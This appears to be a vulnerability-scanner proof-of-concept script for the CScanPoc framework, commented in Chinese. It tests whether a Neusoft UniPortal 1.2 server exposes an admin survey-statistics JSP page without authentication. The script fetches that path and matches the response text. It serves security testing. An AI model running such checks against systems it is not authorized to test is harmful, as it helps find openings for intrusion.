# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Uniportal_0001' # 平台漏洞编号，留空
    name = '东软通用门户软件 UniPortal 1.2存在通用型未授权访问' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.OTHER # 漏洞类型
    disclosure_date = '2015-03-15'  # 漏洞公布时间
    desc = '''
        东软通用门户软件 UniPortal 1.2存在通用型未授权访问
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'UniPortal'  # 漏洞应用名称
    product_version = '1.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cadc2142-e1bb-413c-9ee5-28cf47f52c94'
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url=arg+"/ecdomain/portal/survey/admin/SurveyStatis.jsp"
            code, head, res, errcode, _ = hh.http(url)
            if code==200 and "|<a href=SurveyStatisShow.jsp" in res and '<a href=../SurveyShow.jsp' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()